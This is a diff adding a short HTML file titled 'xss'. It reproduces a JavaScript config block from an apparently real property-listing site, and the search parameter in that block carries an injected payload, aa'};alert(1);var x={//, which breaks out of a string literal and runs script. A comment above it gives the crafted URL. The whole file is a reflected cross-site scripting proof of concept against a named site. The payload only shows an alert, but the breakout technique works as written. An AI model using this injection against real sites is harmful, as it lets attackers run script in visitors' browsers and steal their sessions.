@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>xss</title>
+ </head>
+ <body>
+  
+ </body>
+</html>
+<script type="text/javascript">
+	//http://esf.xxx.com/sh/list/?kw=aa%27};alert(1);var%20x={//
+    var pageConfig = {
+			priceError: {
+				a: '请输入您的售价范围！',
+				d: '请输入1-99999之间的数字！'
+			},
+        arg: '',
+        kw:'aa'};alert(1);var x={//',
+        searchUrl : 'http://esf.pinganfang.com/api/web/xiaoqu/suggest.html',
+        cityid: '1',
+        pageUrl:'http://esf.pinganfang.com/sh/list/pg1/?kw=aa'};alert(1);var x={//', //当前页面url
+        defaultUrl:'http://esf.pinganfang.com/sh/list/',  //搜索用url
+    };
+
+</script>
